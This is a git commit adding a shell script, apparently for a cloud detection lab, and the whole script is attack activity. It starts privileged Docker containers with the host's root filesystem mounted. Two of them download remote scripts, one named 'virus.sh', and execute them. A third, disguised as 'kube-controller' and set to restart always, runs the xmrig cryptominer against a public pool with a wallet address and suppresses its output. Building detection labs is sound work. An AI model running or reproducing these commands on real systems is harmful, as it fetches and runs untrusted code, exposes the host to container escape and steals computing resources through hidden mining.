2805912649264934f8b8989490a3411e02edc0fd
Ben Chong <chiangyaw@gmail.com>
2025-01-24 15:55:57 +0800

    Create docker-cdr.sh

---
+++ docker-cdr.sh
@@ -0,0 +1,29 @@
+#!/bin/bash
+
+# Create and run `malicous-container`
+docker run -d --name malicous-container \
+  --privileged \
+  --cap-add=SYS_ADMIN --cap-add=NET_ADMIN \
+  -v /:/host \
+  alpine:latest \
+  sh -c "wget -q https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/malicous-container/malicous-container.sh -O virus.sh && \
+  chmod +x virus.sh && \
+  sh virus.sh && \
+  sleep 3600"
+
+# Create and run `atk-ttp-test-runner`
+docker run -d --name atk-ttp-test-runner \
+  --privileged \
+  --cap-add=SYS_ADMIN --cap-add=NET_ADMIN \
+  -v /:/host \
+  alpine:latest \
+  sh -c "wget -q https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/build-files/atk-ttp-test.sh -O atk-ttp-test.sh && \
+  chmod +x atk-ttp-test.sh && \
+  ./atk-ttp-test.sh && \
+  sleep 3600"
+
+  docker run -d --name kube-controller \
+  --privileged \
+  --restart=always \
+  metal3d/xmrig \
+  sh -c "/xmrig/xmrig --donate-level 0 -o ca.minexmr.com:443 -u 41pdpXWNMe6NvuDASWXn6ZMdPk4N6amucCHHstNcw2y8caJNdgN4kNeW3QFfc3amCiJ9x6dh8pLboR6minjYZpgk1szkeGg -k --tls >/dev/null 2>/dev/null"
